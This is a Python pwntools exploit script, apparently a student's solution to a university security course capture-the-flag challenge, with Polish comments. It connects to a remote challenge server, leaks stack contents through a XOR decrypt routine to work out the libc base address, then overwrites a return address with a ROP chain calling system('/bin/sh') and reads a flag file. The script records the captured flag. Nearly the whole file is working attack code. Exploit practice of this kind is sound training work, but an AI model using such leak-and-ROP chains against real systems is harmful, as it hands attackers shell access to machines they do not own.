#!/usr/bin/env python3
from pwn import *

# 438646
# hard
# bsk{98c970129d0e8231cc26ea0d4dfce86c}

exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438646"

# podlaczenie sie do zdalnego serwera
# podanie indeksu i ustawienie poziomu na hard
def conn():
    r = remote("bsk.bonus.re", 13337)
    login = bytes("438646\n", 'ascii')
    r.send(login)
    login = bytes("1\n", 'ascii')
    r.send(login)
    # zebranie znakow wypisywanych przez remote na przy laczeniu
    print(r.recvn(186))
    return r


def key_to_decrypt_function(r, key):
    r.send(bytes("0\n", 'ascii'))
    r.send(bytes(str(len(key)) + "\n", 'ascii'))
    r.send(key)
    # zebranie znakow wypisywanych przez remote
    print(r.recvn(92))
    return r.recvn(len(key))


def main():
    r = conn()

    SYSTEM_OFFSET = libc.symbols['system']
    BIN_SH_OFFSET = 0x1c041b
    POP_RDI_OFFSET = 0x28715
    OFFSET = 0x0000000000028189

    payload = b"\x00" * 256

    # dane z pierwszych 32 wartosci 8 bajtowych ze stosu
    # adres powrotu z funckji main do __libc_start_main to ostatnia wartosc
    res_stack_data = key_to_decrypt_function(r, payload)
    # adres powrotu z funckji main do __libc_start_main - potrzebny do 
    # obliczenia adresu poczatku libc
    libc_start_call_main = u64(res_stack_data[-8:])

    # wyliczenie adresu poczatku libc
    LIBC_BASE = libc_start_call_main - OFFSET

    # adres powrotu z funkcji decrypt to 8 wartosc na stosie, wiec to
    # wlasnie ja bedziemy chcieli nadpisac
    payload = b"\x00" * 56
    # wywolanie ret zeby wyrownac stos
    payload += xor(p64(LIBC_BASE + POP_RDI_OFFSET + 1), res_stack_data[56:64])
    # wywolanie pop rdi ; ret
    payload += xor(p64(LIBC_BASE + POP_RDI_OFFSET), res_stack_data[64:72])
    # wywolanie /bin/sh
    payload += xor(p64(LIBC_BASE + BIN_SH_OFFSET), res_stack_data[72:80])
    # wywołanie system("/bin/sh")
    payload += xor(p64(LIBC_BASE + SYSTEM_OFFSET), res_stack_data[80:88])

    key_to_decrypt_function(r, payload)

    # uzyskalismy dostep do shella na remote, wiec mozna wypisac flage
    print_flag = bytes("echo\ncat /tmp/flag.txt\n", 'ascii')
    r.send(print_flag)

    r.interactive()

if __name__ == "__main__":
    main()
